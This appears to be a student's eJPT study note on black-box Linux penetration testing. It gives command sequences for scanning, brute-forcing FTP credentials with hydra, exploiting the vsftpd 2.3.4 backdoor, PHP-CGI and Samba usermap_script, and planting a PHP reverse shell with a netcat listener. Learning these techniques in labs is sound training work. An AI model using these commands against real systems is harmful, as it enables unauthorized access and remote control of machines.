# 46 Linux Exploitation

# Linux Black Box Penetration Test

## Black Box Methodology

- Host discovery
- Port scanning & enumeration
- Vulnerability detection/scanning
- Exploitation
	- Manual
	- Automated
- Post Exploitation
	- Privilege Escalation
	- Persistence
	- Dumping Hashes

---

# Port Scanning & Enumeration

```shell
nmap -T4 -PA -sC -sV -p 1-10000 <ip> -oX <name> # Save in XML format (Metasploit)
	msf6: db_import <file-path> # Import XML in msf
	msf6: auxiliary(scanner/smb/smb_version) # Save the name of the computer trick
nc -nv <ip> <port> # Banner grabbing, connect to bind shell listener 
cat /etc/*release # Release version information
```


# Targeting vsFTPd

```shell
nmap -sV -sC -p21 <ip>
searchsploit vsftpd 2.3.4
searchsploit -m 49757 # Backdoor Command Execution
chmod +x 49757.py # Executable permissions
# This vulnerability was patched closing the port via firewall 

# Search for users in target machine
nmap -sV -p25 <ip>
# Via smtp it's relatively easy enum the users 

# Bruteforce with users found
hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.23.244 ftp
[21][ftp] host: 10.2.23.244   login: service   password: service

# Get a shell
ls -la /usr/share/webshell/php-reverse-shell.php # Select a shell
cp /usr/share/webshell/php-reverse-shell.php . # Copy in current dir
mv php-reverse-shell.php shell.php # Rename the file
nano shell.php # Configure the shell 
ftp: cd dav # The only dir we can put files with this user 
nc -nvlp 1234 # Setup a listener 
<ip>/dav/shell.php # Trigger the shell 
/bin/bash -i # Obtain bash session
```


# Targeting PHP

```shell
nmap -sV -sC -p80 <ip>
<ip>/phpinfo.php # PHP version
searchsploit php cgi
searchsploit -m 18836
python2 18836.py <ip> <port>
nano 11836.py # Modify exploit to obtain reverse shell 
nc -nvlp <port> # Listener
/bin/bash -i
```


# Targeting SAMBA

```shell
nmap -sV -p 445 <ip>
msf6: auxiliary(scanner/smb/smb_version) # Version detection
searchsploit samba
msf6: exploit(multi/samba/usermap_script)
```


#cybersecurity #eJPT 